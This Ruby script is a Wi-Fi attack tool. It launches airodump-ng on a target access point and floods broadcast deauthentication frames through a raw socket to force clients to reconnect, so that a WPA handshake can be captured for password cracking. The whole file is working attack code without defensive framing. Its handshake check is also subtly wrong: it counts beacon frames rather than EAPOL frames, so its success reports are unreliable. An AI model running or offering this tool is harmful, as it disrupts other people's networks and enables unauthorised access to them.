#!/usr/bin/env ruby
# frozen_string_literal: true

require 'json'
require 'time'
require 'open3'

def emit(event, iface, bssid, ssid, channel, data)
  puts JSON.generate(event: event, iface: iface, bssid: bssid, ssid: ssid, channel: channel, data: data, timestamp: Time.now.iso8601)
  $stdout.flush
end

def mac2bin(s)
  s.split(':').map { |b| b.to_i(16).chr }.join
end

def if_nametoindex(name)
  Socket.getifaddrs.select { |a| a.name == name }.first&.ifindex
end

def build_deauth(bssid, station, seq, reason)
  fc = [0xc0, 0x00].pack('C*')
  dur = [0x013a].pack('v')
  sc = [seq << 4].pack('v')
  reason_code = [reason].pack('v')
  fc + dur + station + bssid + bssid + sc + reason_code
end

def verify_handshake(pcap_file)
  return false unless File.exist?(pcap_file)
  count = 0
  File.open(pcap_file, 'rb') do |f|
    global_header = f.read(24)
    return false if global_header.nil? || global_header.size < 24
    loop do
      pkt_header = f.read(16)
      break unless pkt_header && pkt_header.size == 16
      incl_len = pkt_header[8..11].unpack1('V')
      pkt_data = f.read(incl_len)
      break unless pkt_data && pkt_data.size == incl_len
      next if pkt_data.size < 26
      radiotap_len = pkt_data[2..3].unpack1('v')
      next if radiotap_len > pkt_data.size - 2
      frame = pkt_data[radiotap_len..]
      next if frame.nil? || frame.size < 24
      fc = frame[0..1].unpack1('v')
      frame_type = (fc >> 2) & 0x3
      frame_subtype = (fc >> 4) & 0xF
      if frame_type == 0 && frame_subtype == 0x8
        count += 1
        emit('handshake_frame_detected', '', '', '', 0, { eapol_count: count })
      end
    end
  end
  count >= 4
end

begin
  iface = ARGV[0]
  bssid = ARGV[1]
  output_prefix = ARGV[2] || 'handshake'
  channel = (ARGV[3] || '0').to_i
  timeout = (ARGV[4] || '30').to_i

  raise 'interface and bssid required' unless iface && bssid

  emit('handshake_capture_start', iface, bssid, '', channel, { output_prefix: output_prefix, timeout: timeout })

  airodump = `which airodump-ng 2>/dev/null`.strip
  raise 'airodump-ng not found' if airodump.empty?

  pcap_file = "#{output_prefix}-01.cap"
  csv_file = "#{output_prefix}-01.csv"

  dump_cmd = [airodump, '--bssid', bssid, '--channel', channel.to_s, '--write', output_prefix, '--write-interval', '1', iface]
  emit('airodump_launch', iface, bssid, '', channel, { command: dump_cmd.join(' ') })

  dump_pid = spawn(*dump_cmd)
  sleep 2

  sock = Socket.new(Socket::PF_PACKET, Socket::SOCK_RAW, [0x0003].pack('n').unpack1('S'))
  ifidx = if_nametoindex(iface)

  bssid_bin = mac2bin(bssid)
  station_bin = "\xff\xff\xff\xff\xff\xff"

  start_time = Time.now
  handshake_complete = false

  while Time.now - start_time < timeout && !handshake_complete
    seq = rand(0..4095)
    frame = build_deauth(bssid_bin, station_bin, seq, 7)
    addr = Socket.pack_sockaddr_ll([0x0003].pack('n').unpack1('S'), ifidx, 0, 0, 0, '')
    sock.send(frame, 0, addr)

    emit('deauth_sent', iface, bssid, '', channel, { seq: seq })

    sleep 0.5

    handshake_complete = verify_handshake(pcap_file)

    if handshake_complete
      emit('handshake_captured', iface, bssid, '', channel, { pcap: pcap_file, eapol_count: 4 })
    end
  end

  sock.close
  Process.kill('TERM', dump_pid) rescue nil
  Process.wait(dump_pid) rescue nil

  unless handshake_complete
    final = verify_handshake(pcap_file)
    emit('handshake_result', iface, bssid, '', channel, { captured: final, pcap: pcap_file, eapol_count: final ? 4 : 0 })
  end

  emit('handshake_capture_complete', iface, bssid, '', channel, { output_prefix: output_prefix, handshake: handshake_complete })

rescue Interrupt
  emit('handshake_interrupted', iface || '', bssid || '', '', 0, {})
rescue => e
  $stderr.puts JSON.generate(event: 'error', data: { message: e.message, backtrace: e.backtrace&.first }, timestamp: Time.now.iso8601)
  exit 1
end
